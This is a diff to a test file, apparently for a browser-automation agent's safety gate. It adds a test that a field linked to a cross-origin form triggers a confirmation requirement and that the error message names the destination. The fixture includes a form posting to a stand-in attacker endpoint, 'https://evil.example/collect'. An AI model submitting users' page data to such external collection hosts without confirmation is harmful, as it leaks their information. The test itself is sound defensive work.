@@ -143,6 +143,16 @@ describe('cross-origin submissions (Sprint 4)', () => {
     });
   });
 
+  it('names the destination, and also catches a field linked to the form by form="id"', () => {
+    document.body.innerHTML = `
+      <form id="far" action="https://evil.example/collect"></form>
+      <input aria-label="Ville" form="far" />`;
+    const ref = observePage(document, ids).elements.find((e) => e.name === 'Ville')?.ref ?? '';
+    const result = performByRef(step('press'), `snap-${seq}`, ref, { confirmed: false });
+    expect(result).toMatchObject({ ok: false, error: { code: 'CONFIRMATION_REQUIRED' } });
+    expect(result.ok ? '' : result.error.message).toContain('https://evil.example');
+  });
+
   it('a plain button inside that form submits nothing and is not gated', () => {
     const ref = observePage(document, ids).elements.find((e) => e.name === 'Aide')?.ref ?? '';
     expect(performByRef(step('click'), `snap-${seq}`, ref, { confirmed: false }).ok).toBe(true);
